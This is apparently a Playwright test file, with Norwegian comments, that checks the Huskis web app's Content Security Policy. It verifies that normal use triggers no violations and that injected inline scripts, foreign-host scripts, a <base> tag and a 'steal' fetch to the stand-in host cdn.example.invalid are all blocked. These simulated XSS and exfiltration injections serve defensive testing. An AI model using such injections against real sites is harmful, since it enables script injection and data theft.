/*
  Test for at INNHOLDSSIKKERHETSPOLICYEN faktisk håndheves i nettleser — og at
  appen samtidig kjører uten et eneste brudd. Formen på policyen (direktivene,
  hash-en, at meta-taggen og vercel.json er i takt) dekkes av
  tests/security-headers.test.js; denne fila viser at den VIRKER.

  Policyen ligger i en <meta>-tagg i index.html nettopp for at den lokale
  serveren og alle nettlesertestene skal kjøre under den; produksjon får i
  tillegg den samme policyen som HTTP-header. Autoritativt:
  docs/sikkerhetsheadere.md.

  Verifiserer:
    1. Appen laster, logger inn og bygger innhold uten ETT eneste
       securitypolicyviolation — inkludert guarden for kanonisk origin, som
       kjører inline og kun slipper gjennom på hash-en sin.
    2. Oppdateringssjekken får hente /version.json (connect-src 'self').
    3. Avatarbildet vises som data:-URL (img-src data:).
    4. Injisert inline-kode blir BLOKKERT — en XSS med `<script>…</script>`
       kjører ikke, selv om den skulle nå DOM-en.
    5. Injisert skript fra en fremmed vert blir blokkert.
    6. Utsending til en fremmed vert (fetch) blir blokkert — en injisert
       eksfiltrering kommer ikke ut.
    7. En injisert <base> blir blokkert (kan ikke flytte relative URL-er).
    8. Testmodusen henger sammen: mock-backenden ER lastet med ?mock=1 (i
       produksjon finnes ikke filene, se tests/security-headers.test.js).

  Ren policy-oppførsel uten layout-avhengighet → én viewport.

  Kjør:
    python3 -m http.server 8000                    # fra repo-roten, i egen terminal
    NODE_PATH=$(npm root -g) node tests/csp-enforced.test.js
*/
'use strict';
const { chromium } = require('playwright');

const BASE = process.env.HUSKIS_URL || 'http://localhost:8000';

let passed = 0, failed = 0;
function check(name, cond, extra) {
  if (cond) { passed++; console.log('PASS — ' + name); }
  else { failed++; console.log('  ✗ FAIL: ' + name + (extra !== undefined ? '  [' + JSON.stringify(extra) + ']' : '')); }
}

// Bruddene siden sist, som «direktiv ← blokkert URI».
const violations = (p) => p.evaluate(() => window.__csp.slice());

async function register(p) {
  const email = 'u' + Math.floor(Math.random() * 1e9) + '@test.no';
  await p.getByText('Registrer deg').click(); await p.waitForTimeout(300);
  await p.locator('#auth-first-name').fill('Test');
  await p.locator('#auth-last-name').fill('Bruker');
  await p.locator('#auth-email').fill(email);
  await p.locator('#auth-password').fill('passord123');
  await p.locator('#auth-submit').click(); await p.waitForTimeout(700);
  await p.getByText('Tilbake til innlogging').click(); await p.waitForTimeout(300);
  await p.locator('#auth-email').fill(email);
  await p.locator('#auth-password').fill('passord123');
  await p.locator('#auth-submit').click();
  // `lastMy` settes først når get_my_doc har svart — da er kontoen innlogget
  // og dokumentet hentet. (En fersk konto har null områder — board er tomt.)
  await p.waitForFunction(() => {
    const H = window.__huskis;
    return H && H.authUser && H.lastMy;
  }, null, { timeout: 10000, polling: 200 });
  // Introduksjonen (docs/introduksjon.md) møter enhver ny konto: omvisningen
  // legger seg over appen, og et gest-tips legger seg nederst på skjermen —
  // ingen av delene er det denne testen handler om.
  await p.evaluate(() => window.__huskis.tour.skipAll());
  await p.waitForTimeout(150);
}

(async () => {
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ viewport: { width: 1200, height: 900 } });
  const page = await ctx.newPage();
  const pageErrors = [];
  page.on('pageerror', (e) => pageErrors.push(e.message));
  // Samleren må være på plass FØR dokumentet kjører, ellers går bruddene fra
  // guarden og de første ressursene tapt.
  await page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__csp.push(e.effectiveDirective + ' ← ' + e.blockedURI);
    });
  });

  /* ---------- 1) Vanlig bruk: ingen brudd ---------- */
  await page.goto(BASE + '/?mock=1');
  await page.waitForTimeout(700);
  check('guarden for kanonisk origin kjørte (inline, godkjent på hash)',
    await page.evaluate(() => !!(window.__huskisCanonical && window.__huskisCanonical.origin)));
  check('mock-backenden er lastet med ?mock=1 (dev-mock.js → mock-backend.js)',
    await page.evaluate(() => !!window.HK_MOCK));
  check('ingen CSP-brudd ved oppstart', (await violations(page)).length === 0, await violations(page));

  await register(page);
  check('innlogging fungerer under policyen',
    await page.evaluate(() => !!(window.__huskis && window.__huskis.authUser)));

  await page.evaluate(() => {
    const H = window.__huskis, st = H.state;
    const mk = (o) => Object.assign({ ts: 1, org: 't', pos: 0, posTs: 1, posOrg: 't', trashed: false, _role: 'owner' }, o);
    const u = mk({ id: 'uni-csp', name: 'CSP', collapsed: false, groups: [] });
    u.groups.push(mk({ id: 'g-csp', uni: 'uni-csp', name: 'Mappe', cat: null, isCat: false, collapsed: false, cards: [] }));
    st.universes.push(u);
    st.activeUniverse = 'uni-csp'; st.activeGroup = 'g-csp';
    H.render();
  });
  await page.evaluate(() => window.__huskis.openNavModal());
  await page.waitForTimeout(400);
  await page.keyboard.press('Escape');
  await page.waitForTimeout(300);
  check('ingen CSP-brudd etter innlogging, render og modaler',
    (await violations(page)).length === 0, await violations(page));

  /* ---------- 2) Oppdateringssjekken: /version.json ---------- */
  // connect-src 'self'. Fila finnes ikke i kildetreet (den lages av build.js),
  // så det som testes er at forespørselen SLIPPER UT — 404 er et svar.
  const versionFetch = await page.evaluate(() =>
    fetch('/version.json', { cache: 'no-store' })
      .then((r) => 'status:' + r.status)
      .catch((e) => 'blokkert:' + e.message));
  check('oppdateringssjekken får hente /version.json (connect-src self)',
    /^status:/.test(versionFetch), versionFetch);

  /* ---------- 3) Avatar som data:-URL ---------- */
  const dataImg = await page.evaluate(() => new Promise((res) => {
    const im = new Image();
    im.onload = () => res('lastet');
    im.onerror = () => res('blokkert');
    im.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
    document.body.appendChild(im);
  }));
  check('avatarbilder som data:-URL vises (img-src data:)', dataImg === 'lastet', dataImg);

  const beforeAttacks = (await violations(page)).length;

  /* ---------- 4–7) Angrepene skal stoppes ---------- */
  await page.evaluate(() => {
    const s = document.createElement('script');
    s.textContent = 'window.__pwned = true;';
    document.head.appendChild(s);
  });
  await page.waitForTimeout(200);
  check('injisert inline-script kjører IKKE',
    (await page.evaluate(() => window.__pwned)) === undefined,
    await page.evaluate(() => window.__pwned));

  await page.evaluate(() => {
    const s = document.createElement('script');
    s.src = 'https://cdn.example.invalid/x.js';
    document.head.appendChild(s);
  });
  await page.evaluate(() => fetch('https://cdn.example.invalid/steal?d=1').catch(() => {}));
  await page.evaluate(() => {
    const el = document.createElement('base');
    el.href = 'https://cdn.example.invalid/';
    document.head.appendChild(el);
  });
  await page.waitForTimeout(500);

  const after = (await violations(page)).slice(beforeAttacks);
  check('injisert inline-script gir et script-src-brudd',
    after.some((v) => /^script-src(-elem)? ← inline$/.test(v)), after);
  check('injisert skript fra fremmed vert blir blokkert',
    after.some((v) => /^script-src(-elem)? ← https:\/\/cdn\.example\.invalid/.test(v)), after);
  check('fetch til fremmed vert blir blokkert (ingen eksfiltrering)',
    after.some((v) => /^connect-src ← https:\/\/cdn\.example\.invalid/.test(v)), after);
  check('injisert <base> blir blokkert',
    after.some((v) => /^base-uri ← /.test(v)), after);

  check('ingen ukontrollerte JS-feil på siden', pageErrors.length === 0, pageErrors);

  await browser.close();
  console.log(`\n==== ${passed}/${passed + failed} PASS ====`);
  process.exit(failed ? 1 : 0);
})();
